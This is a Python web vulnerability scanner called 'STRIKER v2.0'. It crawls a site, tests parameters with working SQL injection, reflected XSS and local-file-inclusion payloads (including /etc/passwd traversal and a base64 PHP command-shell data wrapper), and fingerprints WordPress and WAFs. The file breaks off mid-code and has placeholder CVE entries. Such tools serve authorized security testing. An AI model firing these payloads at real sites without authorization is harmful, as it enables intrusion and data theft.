#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import json
import csv
import time
import socket
import random
import hashlib
import re
import os
import threading
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Set, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# CONFIGURATION & CONSTANTS
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
]

WAF_SIGNATURES = {
    "Cloudflare": ["CF-RAY", "cf-ray", "cloudflare"],
    "Akamai": ["X-Akamai-Transformed", "X-Akamai-Request-ID"],
    "AWS WAF": ["X-Amzn-RequestId", "X-Amz"],
    "Azure WAF": ["X-Azure-Ref"],
    "Sucuri": ["X-Sucuri-ID", "X-Sucuri-Cloudproxy"],
    "ModSecurity": ["X-Mod-Security"],
    "Barracuda": ["X-Barracuda-Proxy"],
    "F5": ["X-F5", "X-Pool"],
}

REQUEST_TIMEOUT = 10
RETRY_COUNT = 3
DELAY_MIN = 0.5
DELAY_MAX = 1.5

DBMS_FINGERPRINTS = {
    "MySQL": ["sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_error", "you have an error in your sql"],
    "PostgreSQL": ["postgresql", "pgsql", "postgres error", "pg_query", "unterminated"],
    "MSSQL": ["mssql", "microsoft sql", "sql server", "oledb.12", "sysobjects"],
    "Oracle": ["oracle", "ora-", "table or view does not exist", "ojdbc"],
}

THEME_CVE_DB = {
    "divi": {
        "vendor": "Elegant Themes",
        "advisories": [
            {
                "id": "CVE-2023-XXXXX",
                "type": "Stored XSS",
                "severity": "Medium",
                "description": "Stored XSS via module settings (patched in later versions)"
            },
            {
                "id": "CVE-2022-YYYYY",
                "type": "Privilege Escalation",
                "severity": "High",
                "description": "Improper capability checks in backend editor"
            }
        ]
    }
}

# DATA MODELS
@dataclass
class Vulnerability:
    target: str
    vuln_type: str
    parameter: str
    technique: str
    payload: str
    proof: str
    confidence: float
    dbms: Optional[str] = None
    severity: str = "Medium"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    affected_parameter: str = ""
    curl_command: str = ""

    def to_dict(self) -> Dict:
        return asdict(self)

@dataclass
class CrawledURL:
    url: str
    parameters: Dict[str, List[str]] = field(default_factory=dict)
    forms: List[Dict] = field(default_factory=list)
    is_form: bool = False
    depth: int = 0
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

# UTILITY FUNCTIONS
def log_info(message: str):
    print(f"{Fore.CYAN}[*]{Style.RESET_ALL} {message}")

def log_success(message: str):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")

def log_warning(message: str):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")

def log_error(message: str):
    print(f"{Fore.RED}[!]{Style.RESET_ALL} {message}")

def log_vulnerable(message: str):
    print(f"{Fore.RED}[VULNERABLE]{Style.RESET_ALL} {message}")

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def get_random_delay():
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

def is_valid_url(url: str) -> bool:
    try:
        result = urlparse(url)
        return all([result.scheme in ['http', 'https'], result.netloc])
    except:
        return False

def get_domain_from_url(url: str) -> str:
    return urlparse(url).netloc

def is_same_origin(url1: str, url2: str) -> bool:
    return get_domain_from_url(url1) == get_domain_from_url(url2)

def log_title(title: str):
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}══ {title} ══{Style.RESET_ALL}")

def log_kv(key: str, value: str, status: Optional[bool] = None):
    if status is True:
        color = Fore.GREEN
    elif status is False:
        color = Fore.RED
    else:
        color = Fore.CYAN

    print(
        f"{color}[*] {key}: {value}"
        f"{Style.RESET_ALL}")

def safe_request(url: str, method: str = "GET", params: Dict = None,
                 data: Dict = None, timeout: int = REQUEST_TIMEOUT) -> Optional[requests.Response]:
    headers = {"User-Agent": get_random_user_agent()}
    for attempt in range(RETRY_COUNT):
        try:
            if method.upper() == "GET":
                resp = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False)
            else:
                resp = requests.post(url, data=data, headers=headers, timeout=timeout, verify=False)
            return resp
        except requests.exceptions.Timeout:
            log_warning(f"Timeout on {url} (attempt {attempt + 1}/{RETRY_COUNT})")
        except requests.exceptions.ConnectionError:
            log_warning(f"Connection error on {url} (attempt {attempt + 1}/{RETRY_COUNT})")
        except Exception as e:
            log_warning(f"Request error on {url}: {str(e)[:50]}")
        if attempt < RETRY_COUNT - 1:
            time.sleep(1)
    return None

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# SQL INJECTION MODULE (ADVANCED)
class SQLiTester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.baseline_responses: Dict[str, Dict] = {}

    def create_baseline(self, base_url: str, param_name: str, original_value: str) -> Optional[Dict]:
        key = f"{base_url}#{param_name}"
        try:
            resp = safe_request(base_url)
            if not resp:
                return None
            return {
                "status_code": resp.status_code,
                "content_length": len(resp.text),
                "content_hash": hashlib.md5(resp.text.encode()).hexdigest(),
                "text_sample": resp.text[:500],
            }
        except:
            return None

    def is_boolean_injectable(self, base_url: str, param_name: str, 
                              original_value: str, baseline: Dict) -> Tuple[bool, Optional[str]]:
        true_payloads = [
            f"{original_value}' AND '1'='1",
            f"{original_value}' AND 1=1 -- ",
            f"{original_value}' AND 'a'='a",
        ]
        false_payloads = [
            f"{original_value}' AND '1'='0",
            f"{original_value}' AND 1=2 -- ",
            f"{original_value}' AND 'a'='b",
        ]
        for true_payload, false_payload in zip(true_payloads, false_payloads):
            try:
                params_true = {param_name: true_payload}
                resp_true = safe_request(base_url, params=params_true)
                if not resp_true:
                    continue
                params_false = {param_name: false_payload}
                resp_false = safe_request(base_url, params=params_false)
                if not resp_false:
                    continue
                true_hash = hashlib.md5(resp_true.text.encode()).hexdigest()
                false_hash = hashlib.md5(resp_false.text.encode()).hexdigest()
                baseline_hash = baseline.get("content_hash", "")
                if true_hash != false_hash and true_hash == baseline_hash and false_hash != baseline_hash:
                    return True, true_payload
                if resp_true.status_code != resp_false.status_code:
                    if resp_true.status_code == baseline.get("status_code"):
                        return True, true_payload
            except:
                continue
        return False, None

    def is_time_injectable(self, base_url: str, param_name: str, 
                           original_value: str) -> Tuple[bool, Optional[str]]:
        payloads = {
            "MySQL": [
                f"{original_value}' AND SLEEP(5) -- ",
                f"{original_value}' AND IF(1=1,SLEEP(5),0) -- ",
            ],
            "PostgreSQL": [
                f"{original_value}' AND pg_sleep(5) -- ",
            ],
            "MSSQL": [
                f"{original_value}'; WAITFOR DELAY '00:00:05' -- ",
            ],
        }
        for dbms, dbms_payloads in payloads.items():
            for payload in dbms_payloads:
                try:
                    start = time.time()
                    resp_normal = safe_request(base_url)
                    normal_time = time.time() - start
                    if not resp_normal:
                        continue
                    confirmed = 0
                    for _ in range(3):
                        params = {param_name: payload}
                        start = time.time()
                        resp_delayed = safe_request(base_url, params=params, timeout=15)
                        delay_time = time.time() - start
                        if resp_delayed and delay_time >= 4.5:
                            confirmed += 1
                    if confirmed >= 2:
                        return True, payload
                except:
                    continue
        return False, None

    def get_dbms_fingerprint(self, response_text: str) -> Optional[str]:
        text_lower = response_text.lower()
        for dbms, patterns in DBMS_FINGERPRINTS.items():
            for pattern in patterns:
                if pattern.lower() in text_lower:
                    return dbms
        return None

    def is_error_injectable(self, base_url: str, param_name: str, 
                            original_value: str) -> Tuple[bool, Optional[str], Optional[str]]:
        payloads = [
            f"{original_value}'",
            f"{original_value}' AND extractvalue(0,concat(0x7e,version())) -- ",
            f"{original_value}' AND 1=convert(int,(select @@version)) -- ",
            f"{original_value}' AND 1=1 union select null -- ",
        ]
        for payload in payloads:
            try:
                params = {param_name: payload}
                resp = safe_request(base_url, params=params)
                if resp and "error" in resp.text.lower():
                    dbms = self.get_dbms_fingerprint(resp.text)
                    return True, payload, dbms
            except:
                continue
        return False, None, None

    def test_parameter(self, base_url: str, param_name: str, original_value: str) -> List[Vulnerability]:
        vulns = []
        baseline = self.create_baseline(base_url, param_name, original_value)
        if not baseline:
            return vulns
        get_random_delay()
        is_bool_inj, bool_payload = self.is_boolean_injectable(base_url, param_name, original_value, baseline)
        if is_bool_inj:
            log_vulnerable(f"Boolean-based SQLi detected in {param_name}")
            vulns.append(Vulnerability(
                target=base_url,
                vuln_type="SQL Injection",
                parameter=param_name,
                technique="Boolean-based",
                payload=bool_payload,
                proof=f"TRUE/FALSE structural difference confirmed",
                confidence=0.95,
                severity="Critical"
            ))
        get_random_delay()
        is_time_inj, time_payload = self.is_time_injectable(base_url, param_name, original_value)
        if is_time_inj:
            log_vulnerable(f"Time-based SQLi detected in {param_name}")
            vulns.append(Vulnerability(
                target=base_url,
                vuln_type="SQL Injection",
                parameter=param_name,
                technique="Time-based Blind",
                payload=time_payload,
                proof=f"Response delay >=4.5s confirmed (3x validation)",
                confidence=0.90,
                severity="Critical"
            ))
        get_random_delay()
        is_err_inj, err_payload, dbms = self.is_error_injectable(base_url, param_name, original_value)
        if is_err_inj:
            log_vulnerable(f"Error-based SQLi detected in {param_name} ({dbms})")
            vulns.append(Vulnerability(
                target=base_url,
                vuln_type="SQL Injection",
                parameter=param_name,
                technique="Error-based",
                payload=err_payload,
                proof=f"DBMS Error fingerprint: {dbms}",
                confidence=0.85,
                dbms=dbms,
                severity="Critical"
            ))
        return vulns

# XSS MODULE (ADVANCED)
class XSSTester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []

    def detect_context(self, param_value: str, response_text: str) -> str:
        if f'"{param_value}"' in response_text or f"'{param_value}'" in response_text:
            return "Attribute"
        if re.search(rf'<script[^>]*>.*{re.escape(param_value)}.*</script>', response_text, re.DOTALL | re.IGNORECASE):
            return "JavaScript"
        if param_value in response_text and "href=" in response_text:
            return "URL"
        return "HTML Body"

    def get_context_payload(self, context: str) -> str:
        payloads = {
            "HTML Body": "<svg onload=alert('XSS')>",
            "Attribute": '" onmouseover="alert(\'XSS\')" x="',
            "JavaScript": "'; alert('XSS'); //",
            "URL": "javascript:alert('XSS')",
        }
        return payloads.get(context, payloads["HTML Body"])

    def is_reflected_xss(self, base_url: str, param_name: str, 
                         original_value: str) -> Tuple[bool, Optional[str], Optional[str]]:
        test_payload = f'STRIKER_TEST_{int(time.time())}'
        try:
            params = {param_name: test_payload}
            resp = safe_request(base_url, params=params)
            if resp and test_payload in resp.text:
                xss_payload = "<img src=x onerror=alert('XSS')>"
                params = {param_name: xss_payload}
                resp_xss = safe_request(base_url, params=params)
                if resp_xss and xss_payload in resp_xss.text:
                    context = self.detect_context(xss_payload, resp_xss.text)
                    return True, xss_payload, context
        except:
            pass
        return False, None, None

    def test_parameter(self, base_url: str, param_name: str) -> List[Vulnerability]:
        vulns = []
        get_random_delay()
        is_xss, payload, context = self.is_reflected_xss(base_url, param_name, "")
        if is_xss:
            log_vulnerable(f"Reflected XSS detected in {param_name} ({context})")
            vulns.append(Vulnerability(
                target=base_url,
                vuln_type="XSS (Reflected)",
                parameter=param_name,
                technique=f"HTML context: {context}",
                payload=payload,
                proof=f"Payload reflected unescaped in {context}",
                confidence=0.95,
                severity="High"
            ))
        return vulns

# LFI MODULE (ADVANCED)
class LFITester:
    def __init__(self):
        self.vulnerabilities: List[Vulnerability] = []
        self.file_patterns = {
            "Linux": [
                (r"root:.*:0:0:", "/etc/passwd"),
                (r"nobody:.*:65534:65534:", "/etc/passwd"),
            ],
            "Windows": [
                (r"\[boot loader\]", "boot.ini"),
                (r"\[fonts\]", "win.ini"),
            ],
        }

    def detect_file_inclusion(self, response_text: str) -> Tuple[bool, str]:
        for os_type, patterns in self.file_patterns.items():
            for pattern, filename in patterns:
                if re.search(pattern, response_text):
                    return True, filename
        return False, ""

    def get_lfi_payloads(self) -> List[Tuple[str, str]]:
        payloads = [
            ("../../../../etc/passwd", "etc/passwd"),
            ("../../etc/passwd", "etc/passwd"),
            ("..%2F..%2F..%2Fetc%2Fpasswd", "etc/passwd - double encoded"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "php filter"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydxJ10pOyA/Pg==", "data wrapper"),
            ("..\\..\\windows\\win.ini", "windows/win.ini"),
            ("..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows hosts"),
        ]
        return payloads

    def test_parameter(self, base_url: str, param_name: str) -> List[Vulnerability]:
        vulns = []
        payloads = self.get_lfi_payloads()
        for payload, desc in payloads:
            try:
                get_random_delay()
                params = {param_name: payload}
                resp = safe_request(base_url, params=params)
                if resp:
                    is_included, filename = self.detect_file_inclusion(resp.text)
                    if is_included:
                        log_vulnerable(f"LFI detected in {param_name} - {filename}")
                        vulns.append(Vulnerability(
                            target=base_url,
                            vuln_type="Local File Inclusion",
                            parameter=param_name,
                            technique=desc,
                            payload=payload,
                            proof=f"File content detected: {filename}",
                            confidence=0.98,
                            severity="Critical"
                        ))
                        break
            except:
                continue
        return vulns

# CRAWLER MODULE (ADVANCED)
class AdvancedCrawler:
    def __init__(self, base_url: str, max_depth: int = 3):
        self.base_url = base_url
        self.max_depth = min(max_depth, 5)
        self.visited: Set[str] = set()
        self.crawled_data: Dict[str, CrawledURL] = {}
        self.domain = get_domain_from_url(base_url)

    def parse_robots_txt(self) -> Set[str]:
        paths = set()
        try:
            robots_url = urljoin(self.base_url, "/robots.txt")
            resp = safe_request(robots_url)
            if resp and resp.status_code == 200:
                for line in resp.text.split('\n'):
                    line = line.strip().lower()
                    if line.startswith('sitemap:'):
                        sitemap_url = line.replace('sitemap:', '').strip()
                        log_success(f"Found sitemap in robots.txt: {sitemap_url}")
                        paths.update(self.parse_sitemap_xml(sitemap_url))
                    elif line.startswith('disallow:'):
                        path = line.replace('disallow:', '').strip()
                        if path and path != '/':
                            paths.add(urljoin(self.base_url, path))
        except:
            pass
        return paths

    def parse_sitemap_xml(self, sitemap_url: str) -> Set[str]:
        urls = set()
        try:
            resp = safe_request(sitemap_url)
            if resp and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'xml')
                for loc in soup.find_all('loc'):
                    url = loc.text.strip()
                    if is_same_origin(url, self.base_url):
                        urls.add(url)
        except:
            pass
        return urls

    def extract_parameters(self, url: str) -> Dict[str, List[str]]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v for k, v in params.items()}

    def extract_forms(self, html: str, page_url: str) -> List[Dict]:
        forms = []
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(page_url, form.get('action', '')),
                    'method': form.get('method', 'GET').upper(),
                    'fields': []
                }
                for field in form.find_all(['input', 'textarea', 'select']):
                    field_data = {
                        'name': field.get('name', ''),
                        'type': field.get('type', 'text'),
                    }
                    if field_data['name']:
                        form_data['fields'].append(field_data)
                forms.append(form_data)
        except:
            pass
        return forms

    def crawl(self) -> Dict[str, CrawledURL]:
        log_info(f"Starting crawl with max depth {self.max_depth}")
        self._crawl_recursive(self.base_url, 0)
        log_success(f"Crawled {len(self.visited)} URLs")
        return self.crawled_data

    def _crawl_recursive(self, url: str, depth: int):
        if depth > self.max_depth or url in self.visited:
            return
        if not is_same_origin(url, self.base_url):
            return
        self.visited.add(url)
        log_info(f"[Depth {depth}] Crawling: {url}")
        try:
            resp = safe_request(url)
            if not resp or resp.status_code >= 400:
                return
            params = self.extract_parameters(url)
            forms = self.extract_forms(resp.text, url)
            crawled = CrawledURL(url=url, parameters=params, forms=forms, is_form=len(forms) > 0, depth=depth)
            self.crawled_data[url] = crawled
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link_tag in soup.find_all('a', href=True):
                try:
                    full_url = urljoin(url, link_tag['href'])
                    if is_same_origin(full_url, self.base_url) and full_url not in self.visited:
                        self._crawl_recursive(full_url, depth + 1)
                except:
                    continue
        except:
            pass

class WordPressDetector:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")
        self.timeout = 10

    def is_wordpress(self) -> bool:
        try:
            resp = safe_request(self.base_url)
            if resp and "wp-content" in resp.text.lower():
                return True
        except:
            pass
        return False

    def detect_version(self) -> Optional[str]:
        # Method 1: readme.html
        try:
            resp = safe_request(f"{self.base_url}/readme.html")
            if resp and resp.status_code == 200:
                match = re.search(r"Version:\s*([\d\.]+)", resp.text, re.IGNORECASE)
                if match:
                    return match.group(1)
        except:
            pass

        # Method 2: meta generator
        try:
            resp = safe_request(self.base_url)
            if resp:
                match = re.search(
                    r'<meta name="generator" content="WordPress\s*([\d\.]+)"',
                    resp.text,
                    re.IGNORECASE
                )
                if match:
                    return match.group(1)
        except:
            pass

        return None

    def detect_theme(self) -> Optional[str]:
        try:
            resp = safe_request(self.base_url)
            if resp:
                match = re.search(
                    r"/wp-content/themes/([\w\-]+)/",
                    resp.text,
                    re.IGNORECASE
                )
                if match:
                    return match.group(1)
        except:
            pass
        return None

    def check_theme_advisories(self, theme_name: str) -> List[Dict]:
        """
        Passive OSINT check for known public advisories.
        NO exploitation. NO target interaction.
        """
        if not theme_name:
            return []

        theme_key = theme_name.lower()
        theme_data = THEME_CVE_DB.get(theme_key)

        if not theme_data:
            return []

        return theme_data.get("advisories", [])

    def detect_plugins(self) -> List[str]:
        plugins = set()
        try:
            resp = safe_request(self.base_url)
            if not resp:
                return []

            soup = BeautifulSoup(resp.text, "html.parser")
            for tag in soup.find_all(["script", "link"]):
                src = tag.get("src") or tag.get("href")
                if not src:
                    continue

                match = re.search(r"/wp-content/plugins/([\w\-]+)/", src)
                if match:
                    plugins.add(match.group(1))

        except:
            pass

        return sorted(list(plugins))

    def _check_endpoint(self, path: str) -> bool:
        try:
            resp = safe_request(f"{self.base_url}{path}")
            if resp and resp.status_code in (200, 401, 403):
                return True
        except:
            pass
        return False

    def analyze_rest_api(self) -> Dict:
        data = {"enabled": False}
        try:
            resp = safe_request(f"{self.base_url}/wp-json/")
            if resp and resp.status_code == 200:
                json_data = resp.json()
                data["enabled"] = True
                data["site_name"] = json_data.get("name")
                data["description"] = json_data.get("description")
                data["namespaces"] = json_data.get("namespaces", [])
        except:
            pass
        return data

    def scan(self) -> Dict:
        log_info("Scanning for WordPress...")

        findings = {
            "is_wordpress": False,
            "version": None,
            "theme": None,
            "plugins": [],
            "endpoints": {},
            "rest_api": {},
            "theme_advisories": [],
        }

        if not self.is_wordpress():
            log_warning("WordPress not detected")
            return findings

        findings["is_wordpress"] = True

        findings["version"] = self.detect_version()
        findings["theme"] = self.detect_theme()
        findings["theme_advisories"] = self.check_theme_advisories(findings["theme"])
        findings["plugins"] = self.detect_plugins()

        findings["endpoints"] = {
            "wp_admin": self._check_endpoint("/wp-admin/"),
            "wp_login": self._check_endpoint("/wp-login.php"),
            "xmlrpc": self._check_endpoint("/xmlrpc.php"),
            "rest_api": self._check_endpoint("/wp-json/")
        }

        findings["rest_api"] = self.analyze_rest_api()

        log_title("WordPress Detection")

        log_kv("Detected", "YES", True)

        log_kv("Version",
        findings["version"] if findings["version"] else "Not detected",
        bool(findings["version"])
        )

        if findings["theme"]:
            log_info(f"Active theme: {findings['theme']}")

        if findings["plugins"]:
            log_info(f"Plugins detected: {len(findings['plugins'])}")

        log_title("WordPress Endpoints")

        for ep, enabled in findings["endpoints"].items():
            log_kv(ep, "OPEN" if enabled else "CLOSED", enabled)

        return findings

        if findings["theme_advisories"]:
            log_warning(f"Public security advisories found for theme '{findings['theme']}':")
            for adv in findings["theme_advisories"]:
                log_info(
                    f"- {adv['id']} | {adv['type']} | Severity: {adv['severity']}"
                )
            log_info("Note: Informational only. No exploitation performed.")

# WAF DETECTION
class WAFDetector:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.waf_detected: Optional[str] = None
        self.confidence: float = 0.0

    def detect_from_headers(self) -> Tuple[Optional[str], float]:
        try:
            resp = safe_request(self.base_url)
            if not resp:
                return None, 0.0
            headers = resp.headers
            for waf_name, signatures in WAF_SIGNATURES.items():
                matches = 0
                for sig in signatures:
                    for header_value in headers.values():
                        if sig.lower() in str(header_value).lower():
                            matches += 1
                if matches > 0:
                    confidence = min(0.95, matches * 0.3)
                    return waf_name, confidence
        except:
            pass
        return None, 0.0

    def detect_from_behavior(self) -> Tuple[Optional[str], float]:
        try:
            payload = "' OR '1'='1"
            params = {'test': payload}
            resp = safe_request(self.base_url, params=params)
            if resp and resp.status_code == 403:
                return "Unknown WAF", 0.7
        except:
            pass
        return None, 0.0

    def scan(self) -> Dict:
        log_info("Detecting WAF...")
        waf, conf = self.detect_from_headers()
        if not waf:
            waf, conf = self.detect_from_behavior()
        result = {
            'waf_detected': waf is not None,
            'waf_name': waf,
            'confidence': conf
        }
        if waf:
            log_warning(f"WAF detected: {waf} (confidence: {conf:.0%})")
        else:
            log_success("No common WAF detected")
        return result

# REPORT GENERATION
class ReportGenerator:
    def __init__(self, vulnerabilities: List[Vulnerability], output_dir: str = "./reports"):
        self.vulnerabilities = vulnerabilities
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def generate_json(self) -> str:
        data = {
            'timestamp': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': [v.to_dict() for v in self.vulnerabilities],
            'summary': self._get_summary()
        }
        filename = self.output_dir / f"striker_report_{self.timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        return str(filename)

    def generate_csv(self) -> str:
        filename = self.output_dir / f"striker_report_{self.timestamp}.csv"
        with open(filename, 'w', newline='') as f:
            if self.vulnerabilities:
                writer = csv.DictWriter(f, fieldnames=self.vulnerabilities[0].to_dict().keys())
                writer.writeheader()
                for vuln in self.vulnerabilities:
                    writer.writerow(vuln.to_dict())
        return str(filename)

    def generate_html(self) -> str:
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Striker Security Report</title>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        h1 {{ color: #333; border-bottom: 3px solid #d32f2f; padding-bottom: 10px; }}
        h2 {{ color: #555; margin-top: 30px; }}
        table {{ width: 100%; border-collapse: collapse; background: white; margin-bottom: 20px; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background: #d32f2f; color: white; }}
        tr:hover {{ background: #f5f5f5; }}
        .summary {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .critical {{ color: #d32f2f; font-weight: bold; }}
        .high {{ color: #f57c00; font-weight: bold; }}
        .medium {{ color: #fbc02d; font-weight: bold; }}
        .low {{ color: #388e3c; font-weight: bold; }}
        code {{ background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }}
    </style>
</head>
<body>
    <h1>🔐 STRIKER v2.0 - Security Assessment Report</h1>
    <p>Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    <div class="summary">
        {self._get_summary_html()}
    </div>
    <h2>Vulnerabilities</h2>
"""
        if self.vulnerabilities:
            html_content += """
    <table>
        <tr>
            <th>Target</th>
            <th>Type</th>
            <th>Parameter</th>
            <th>Severity</th>
            <th>Confidence</th>
            <th>Payload</th>
            <th>Proof</th>
        </tr>
"""
            for vuln in self.vulnerabilities:
                severity_class = vuln.severity.lower()
                html_content += f"""
        <tr>
            <td><code>{vuln.target}</code></td>
            <td>{vuln.vuln_type}</td>
            <td><code>{vuln.parameter}</code></td>
            <td class="{severity_class}">{vuln.severity}</td>
            <td>{vuln.confidence:.0%}</td>
            <td><code>{vuln.payload[:50]}</code></td>
            <td>{vuln.proof}</td>
        </tr>
"""
            html_content += "</table>"
        else:
            html_content += "<p>No vulnerabilities detected.</p>"
        
        html_content += """
</body>
</html>
"""
        
        filename = self.output_dir / f"striker_report_{self.timestamp}.html"
        with open(filename, 'w') as f:
            f.write(html_content)
        
        return str(filename)

    def _get_summary(self) -> Dict:
        summary = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'by_type': {}
        }
        for vuln in self.vulnerabilities:
            summary[vuln.severity.lower()] += 1
            vuln_type = vuln.vuln_type
            summary['by_type'][vuln_type] = summary['by_type'].get(vuln_type, 0) + 1
        return summary

    def _get_summary_html(self) -> str:
        summary = self._get_summary()
        return f"""
<h3>Summary</h3>
<p>
    <strong>Total Vulnerabilities:</strong> {len(self.vulnerabilities)}<br>
    <strong>Critical:</strong> <span class="critical">{summary['critical']}</span> |
    <strong>High:</strong> <span class="high">{summary['high']}</span> |
    <strong>Medium:</strong> <span class="medium">{summary['medium']}</span> |
    <strong>Low:</strong> <span class="low">{summary['low']}</span>
</p>
"""

    def generate_all(self) -> List[str]:
        files = [
            self.generate_json(),
            self.generate_csv(),
            self.generate_html()
        ]
        log_success(f"Reports generated in {self.output_dir}")
        for f in files:
            log_success(f"  ✓ {Path(f).name}")
        return files

# MAIN SCANNER
class StrikerScanner:
    def __init__(self, target_url: str):
        if not is_valid_url(target_url):
            raise ValueError("Invalid URL")
        self.target_url = target_url
        self.vulnerabilities: List[Vulnerability] = []
        self.crawled_data: Dict[str, CrawledURL] = {}
        self.all_findings: Dict = {}

    def scan_sql_injection(self, urls: List[str]):
        log_info(f"Starting SQL Injection scan ({len(urls)} URLs)")
        tester = SQLiTester()
        
        for url in urls[:10]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name, param_values in params.items():
                original_value = param_values[0] if param_values else ""
                vulns = tester.test_parameter(url, param_name, original_value)
                self.vulnerabilities.extend(vulns)

    def scan_xss(self, urls: List[str]):
        log_info(f"Starting XSS scan ({len(urls)} URLs)")
        tester = XSSTester()
        
        for url in urls[:10]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name in params.keys():
                vulns = tester.test_parameter(url, param_name)
                self.vulnerabilities.extend(vulns)

    def scan_lfi(self, urls: List[str]):
        log_info(f"Starting LFI scan ({len(urls)} URLs)")
        tester = LFITester()
        
        for url in urls[:10]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param_name in params.keys():
                vulns = tester.test_parameter(url, param_name)
                self.vulnerabilities.extend(vulns)

    def advanced_scan(self, max_depth: int = 3):
        log_info("=" * 70)
        log_info("STRIKER v2.0 - ADVANCED VULNERABILITY SCAN")
        log_info("=" * 70)
        
        crawler = AdvancedCrawler(self.target_url, max_depth=max_depth)
        self.crawled_data = crawler.crawl()
        
        urls_with_params = [url for url, data in self.crawled_data.items() if data.parameters]
        
        if urls_with_params:
            self.scan_sql_injection(urls_with_params)
            self.scan_xss(urls_with_params)
            self.scan_lfi(urls_with_params)
        else:
            log_warning("No URLs with parameters found")

        wp_detector = WordPressDetector(self.target_url)
        self.all_findings['wordpress'] = wp_detector.scan()
        
        waf_detector = WAFDetector(self.target_url)
        self.all_findings['waf'] = waf_detector.scan()
        
        reporter = ReportGenerator(self.vulnerabilities)
        report_files = reporter.generate_all()
        
        log_info("=" * 70)
        log_success(f"Scan complete! Found {len(self.vulnerabilities)} vulnerabilities")
        log_info("=" * 70)
        
        return report_files

# INTERACTIVE MENU
def print_banner():
    banner = f"""
{Fore.RED}
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                    STRIKER v2.0 - Professional Edition                    ║
║              Advanced Web Vulnerability Scanner & OSINT Tool              ║
║                                                                            ║
║  Defensive Security Assessment | Attack Surface Analysis | Hardening      ║
║  [AUTHORIZED AUDITS & AUTHORIZED TARGETS ONLY]                           ║
║                                                                            ║
║  ✓ SQL Injection  ✓ XSS  ✓ LFI  ✓ Advanced Crawling                     ║
║  ✓ WordPress/Joomla Detection  ✓ WAF Identification  ✓ Professional Reports
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}[!] DISCLAIMER:{Style.RESET_ALL}
    • Unauthorized testing is ILLEGAL
    • Only scan targets you own or have explicit written permission for
    • End users are responsible for legal compliance
    • Tool author assumes NO liability for misuse
"""
    print(banner)

def main_menu():
    print_banner()
    while True:
        print(f"""
{Fore.BLUE}┌─ MAIN MENU ─────────────────────────────────────────────┐{Style.RESET_ALL}
{Fore.WHITE}1) Advanced Scan (Full assessment with crawling)
2) SQL Injection Testing
3) XSS Testing
4) LFI Testing
5) WordPress Detection
6) WAF Detection
7) Subdomain Enumeration (Not implemented)
0) Exit{Style.RESET_ALL}
{Fore.BLUE}└─────────────────────────────────────────────────────────┘{Style.RESET_ALL}
""")
        choice = input("Select option: ").strip()

        if choice == "1":
            target = input("Enter target URL (e.g., https://example.com): ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            depth = input("Max crawl depth (1-5, default 3): ").strip()
            try:
                depth = max(1, min(5, int(depth))) if depth else 3
            except:
                depth = 3
            try:
                scanner = StrikerScanner(target)
                scanner.advanced_scan(max_depth=depth)
            except Exception as e:
                log_error(f"Scan error: {str(e)}")

        elif choice == "2":
            target = input("Enter target URL: ").strip()
            if not is_valid_url(target):
                log_error("Invalid URL")
                continue
            try:
                scanner = StrikerScanner(target)
                crawler = AdvancedCrawler(target, max_depth=4)
